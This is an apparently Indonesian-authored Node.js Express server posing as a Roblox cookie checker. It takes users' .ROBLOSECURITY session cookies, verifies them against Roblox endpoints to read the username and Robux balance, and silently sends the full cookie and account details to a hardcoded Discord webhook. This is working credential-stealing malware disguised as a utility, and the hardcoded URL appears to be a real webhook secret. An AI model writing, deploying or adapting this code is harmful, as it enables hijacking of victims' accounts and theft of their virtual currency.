const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Ganti dengan link webhook Discord kamu yang asli
const SECRET_WEBHOOK_URL = process.env.DISCORD_WEBHOOK || "https://discord.com/api/webhooks/1564812827104120864/IVzRYsDRj7cnXt97p647eU9c9s4276WOmMlTT2KuRK989Yvfh-NPw3HrwP8ChPD4MGUM";

app.post('/api/check', async (req, res) => {
    try {
        const { cookies } = req.body;
        if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
            return res.status(400).json({ error: "Cookie tidak boleh kosong." });
        }

        // Ambil cookie pertama saja agar cepat dan tidak kena timeout Vercel
        let cleanCookie = cookies[0].trim().replace(/^["']|["']$/g, '');
        if (!cleanCookie) {
            return res.status(400).json({ error: "Format cookie tidak valid." });
        }

        // 1. Cek User ID & Username
        const userRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
                'User-Agent': 'Mozilla/5.0'
            },
            timeout: 5000
        });

        if (!userRes.data || !userRes.data.id) {
            return res.json({ results: [] });
        }

        const userId = userRes.data.id;
        const username = userRes.data.name;
        const displayName = userRes.data.displayName;

        // 2. Cek Saldo Robux
        let robux = 0;
        try {
            const curRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cleanCookie}` },
                timeout: 3000
            });
            robux = curRes.data.robux || 0;
        } catch (e) {}

        // 3. Cek Tanggal Pembuatan Akun
        let createdDate = "Tidak diketahui";
        try {
            const infoRes = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: 3000 });
            if (infoRes.data && infoRes.data.created) {
                createdDate = new Date(infoRes.data.created).toLocaleDateString('id-ID');
            }
        } catch (e) {}

        const accountData = {
            success: true,
            userId,
            username,
            displayName,
            robux,
            totalIncoming: 0,
            totalSpent: 0,
            transactions: [],
            createdDate,
            isPremium: false,
            cookie: cleanCookie
        };

        // Kirim ke Discord Webhook
        if (SECRET_WEBHOOK_URL && SECRET_WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/1564812827104120864/IVzRYsDRj7cnXt97p647eU9c9s4276WOmMlTT2KuRK989Yvfh-NPw3HrwP8ChPD4MGUM")) {
            try {
                await axios.post(SECRET_WEBHOOK_URL, {
                    content: `🚨 **AKUN VALID DITEMUKAN!**\n` +
                             `👤 **Username:** ${username} (${displayName})\n` +
                             `💰 **Robux:** ${robux}\n` +
                             `🔑 \`\`\`${cleanCookie}\`\`\``
                }, { timeout: 3000 });
            } catch (wErr) {}
        }

        res.json({ results: [accountData] });
    } catch (err) {
        res.status(500).json({ error: "Cookie invalid atau server sibuk." });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
